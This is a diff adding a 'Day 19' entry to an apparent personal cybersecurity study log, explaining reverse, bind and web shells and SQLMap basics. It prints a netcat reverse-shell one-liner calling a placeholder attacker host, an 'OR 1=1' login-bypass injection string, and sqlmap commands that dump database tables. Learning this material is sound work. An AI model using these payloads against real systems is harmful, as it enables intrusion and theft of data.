@@ -803,6 +803,51 @@ The code is as follows: gobuster vhost -u “URL” -w <path to wordlist>, but s
 
 so we can use the code gobuster vhost -u “URL or IP” -d example.thm -w <path to wordlist> - - append-domain --exclude-length 250-320 
 
+### DAY 19 – Shells Overview, SQLMaps ### 	
+With Shells Overview, I was reintroduced to reverse shells, bind shells, and web shells.
+To start off, shells are programs that let us interact with the Operating System, but it isn’t only the shell that is working. We also have the terminal, which is responsible for the input and output of the user, like capturing keystrokes and displaying text. The TTY is responsible for how for the flow of data and other inputs like job control, or signal buffering. These 3 makes up how we interact with an OS. 
+
+In obtaining a reverse shell, the attacker will have to get a payload across the target which then the payload will execute in the target creating a socket with an outbound connection toward the attacker’s specified socket. This is usually used when incoming traffic is heavily guarded. Reverse shells are stable, and maintain proper connection on the right circumstances. 
+An example of this is creating this payload 
+Note: Attacker must listen before this payload is executed. 
+
+rm -f /tmp/f; mkfifo /tmp/f; cat tmp/f | bash -I 2>&1 | nc ATT_IP ATT_PORT > /tmp/f
+
+
+This utilizes the named pipe called FIFO that is used as a tunnel to send commands and receive outputs from it. This is a half-duplex communication, as CAT is on standby, and when the attacker sends a command through the socket. cat wakes up, reads the command, forwards it to the shell, and forwards the result to the attacker and then the process repeats.    
+
+But that doesn’t mean that this’ll always work as this requires the target to have netcat installed. That’s why other tools like /dev/tcp are used in creating these types of payloads. 
+And if that doesn’t work, having an extended knowledge about interpreters like PHP or Python can be handy as these can create connections, sockets, can spawn shells, and can also attach PTY to it. 
+
+Bind shells also work the same but this time the attacker is the one that generates an outbound connection towards the target’s socket, but with today’s security. These aren’t preferred as much since incoming traffic can be highly filtered by the Firewall, the NAT, and other security measures. This type of shells is noisier, and less stable compared to its counterpart. But that doesn’t mean that it’s not used, when outbound traffic is regulated, this shell might be preferred over the Reverse Shell. 
+We also have tools that we can use to make our experiences better: 
+
+We have ncat (This is similar to netcat but has more advanced features to it), rlwarp (creates a better environment or terminal experience in the user side only), and socat (attaches a PTY or a Pseudo Terminal to the socket over the network that will add features like flow control, or other input commands like arrow keys. Basically, it makes it feel like that we are actually interacting with a terminal.)
+
+Lastly, we have Web Shells. Web shells allow us to communicate with the Web Server and the OS running on it. This is quite different to Bind and Reverse shells as this shell is a command-by-command wherein every command is like a new memory. Commands don’t take context from previous commands because as soon as a HTTP request is sent and a response is received, the connection ends and a new one is created. Web shells are targeted via improper sanitization of input forms or unrestricted file uploads. These can let us inject and upload scripts that can help us talk to the web server and escalate things after we have established a connection. 
+
+Next is the basics of using the tool SQLMap and how we can use injection to elevate or get pass through authentication.
+
+Let’s start with improper sanitation of authentication requests. Knowing how the SQL language works, let’s say a database is connected to an authentication request for a website. Whenever we type in our username and password the website generates this command and checks the database if it matches. 
+
+SELECT * FROM USERS WHERE username = ‘John’ AND password =’Believeme’ 
+This means that we have entered the username John and the password Believe me. Since it is an AND logic, if it finds anything from the database that matches both it will authenticate us. But let’s say we don’t know any of that information, we don’t know the username nor the password. This is where injection comes in with the manipulation of the command sent. 
+
+If we type in username as abc, and password as abc’ OR 1=1;-- -
+
+This will make the program look like this 
+SELECT * FROM USERS Where username = ‘abc’ AND password = ‘abc’ OR 1=1;-- -‘; 
+
+This will evaluate the AND statement and will proceed to evaluate the OR statement which will always be true. Meaning without knowing the password and username, we are authenticated by just having an extensive knowledge of the SQL language. This works with websites that have poor sanitation with their input forms. 
+
+Next is the SQLMap tool itself, this tool is used to identify injection vulnerabilities and exploit those vulnerabilities in a database in a web application. 
+The command is simple, we can use sqlmap -u and the followed with the URL that contains user input which talks with the web server, which then interacts with the database to check the data. The URL is usually composed of GET or POST requests that are sent through the web application which constructs a qurey to the database for checking. This can either be in the URL or in the HTTP request body if it’s a POST. Typing in the the url and then if it finds any vulnerabilities and exploits of injection then it can enumerate databases and tables and even dump in the contents of those tables. This means that unsafe logic from the web application can cause the database to be exploited. The command is as follows of the things that I’ve learned. The scope of this room was to introduce me to this part of SQLMap which was identifying SQL injection vulnerabilities and exploits. 
+
+sqlmap -u “.com “ –db (This is for enumerating the databases) 
+sqlmap -u “.com “ -D name_database –tables (this is for enumerating the tables of the specific retrieved database)
+sqlmap -u “.com “ -D name_database -T table_name –dump, this dumps the content of that table. 
+
+
 
 
 
